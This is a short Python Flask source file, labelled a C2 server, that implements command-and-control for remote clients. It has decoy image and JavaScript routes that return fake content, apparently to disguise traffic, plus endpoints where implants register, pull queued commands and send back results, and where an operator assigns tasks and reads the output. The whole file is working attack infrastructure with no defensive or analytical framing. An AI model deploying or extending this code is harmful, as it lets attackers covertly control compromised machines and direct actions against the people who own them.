# c2 server Dillon Rollins
from flask import Flask, request, jsonify
import random

app = Flask(__name__)

# Store commands and responses
commands = {}
responses = {}

@app.route('/images/<image_id>', methods=['GET'])
def get_image(image_id):
    """
    Mimic an image request endpoint.
    """
    # Return a fake image response
    return "Fake image data", 200, {'Content-Type': 'image/jpeg'}

@app.route('/js/<script_id>', methods=['GET'])
def get_script(script_id):
    """
    Mimic a JavaScript request endpoint.
    """
    # Return a fake script response
    return "console.log('Fake script');", 200, {'Content-Type': 'application/javascript'}

@app.route('/api/v1/register', methods=['POST'])
def register():
    """
    Register a new client.
    """
    client_id = request.json.get('client_id')
    if client_id:
        commands[client_id] = None
        responses[client_id] = None
        return jsonify({"status": "registered", "client_id": client_id})
    return jsonify({"status": "error", "message": "No client ID provided"}), 400

@app.route('/api/v1/task', methods=['GET'])
def get_task():
    """
    Send a task (command) to the client.
    """
    client_id = request.args.get('client_id')
    if client_id in commands:
        task = commands.get(client_id)
        commands[client_id] = None  # Clear the task after sending
        return jsonify({"task": task})
    return jsonify({"status": "error", "message": "Client not found"}), 404

@app.route('/api/v1/result', methods=['POST'])
def post_result():
    """
    Receive the result from the client.
    """
    client_id = request.json.get('client_id')
    result = request.json.get('result')
    if client_id in responses:
        responses[client_id] = result
        return jsonify({"status": "success"})
    return jsonify({"status": "error", "message": "Client not found"}), 404

@app.route('/api/v1/assign_task', methods=['POST'])
def assign_task():
    """
    Assign a task to a specific client.
    """
    client_id = request.json.get('client_id')
    task = request.json.get('task')
    if client_id in commands:
        commands[client_id] = task
        return jsonify({"status": "success", "task": task})
    return jsonify({"status": "error", "message": "Client not found"}), 404

@app.route('/api/v1/get_result', methods=['GET'])
def get_result():
    """
    Retrieve the result from a specific client.
    """
    client_id = request.args.get('client_id')
    if client_id in responses:
        result = responses.get(client_id)
        responses[client_id] = None  # Clear the result after retrieving
        return jsonify({"result": result})
    return jsonify({"status": "error", "message": "Client not found"}), 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)